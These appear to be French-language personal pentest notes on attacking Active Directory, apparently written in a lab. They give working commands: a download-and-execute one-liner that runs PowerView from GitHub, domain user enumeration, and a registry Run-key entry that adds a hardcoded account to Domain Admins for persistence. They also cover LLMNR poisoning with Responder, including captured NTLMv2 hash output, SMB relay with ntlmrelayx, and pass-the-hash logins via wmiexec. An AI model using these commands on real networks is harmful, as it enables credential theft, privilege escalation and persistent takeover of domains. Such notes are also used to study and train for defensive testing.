https://github.com/PowerShellMafia/PowerSploit/tree/dev
`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')`
(Get-DomainPolicy)."SystemAccess"
Get-DomainUser |  ?{$_.description -ne ""} | select name,description
Get-DomainUser | ?{$_.description} | select name,description
Get-DomainUser |  ?{$_.description} | select samaccountname,description
Get-NetComputer -OperatingSystem “*Server 2008*” | select name,operatingsystem

https://github.com/samratashok/ADModule

## Créer un user au run
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "StartUpdate" -Value "cmd.exe /c `"net user testadmin Passw0rd /domain /add && net group `"Admins du domaine`" testadmin /add /domain`"" -PropertyType String -Force

Hack avec ce qui existe déjà sur une machine standard : https://lolbas-project.github.io/


## LLMNR Poisoning - Récupérer le hash de l'user

Vérifier que SMB et HTTP sont ON dans /etc/responder/responder.conf 
Ecoute du réseau depuis eth1, et poisoning lorsqu'un événement LLMNR (résolution de noms sur un réseau local lorsque les machines ne sont pas inscrites dans le serveur DNS du domaine) arrive
sudo responder –I eth1 –dwPv
*Ouvrir un share inexistant sur une des machines*
[SMB] NTLMv2-SSP Client   : fe80::19f:7658:c3c3:68db
[SMB] NTLMv2-SSP Username : WODENSEC\Administrateur
[SMB] NTLMv2-SSP Hash     : Administrateur::WODENSEC::hash

## SMB Relay

Vérifier les machines vulnérables sur le réseau :
nmap –p 445 --script=smb2-security-mode --open 10.0.2.0/24
-> SMB Signing doit être disabled ou enabled but not required.
Mettre les IP dans un fichier targets.txt
Vérifier que SMB et HTTP sont OFF dans /etc/responder/responder.conf  
La cible doit être local admin.
Lancer les listeners :
sudo responder –I eth1 –dwPv
Dans un autre terminal :
impacket-ntlmrelayx -tf /home/kali/adlab/target.txt -smb2support
Résultat :
![[Pasted image 20231222145149.png]]

## Ouvrir une session avec un hash
impacket-wmiexec installpc@9.11.93.6 -hashes *hash*
Tester aussi psexex...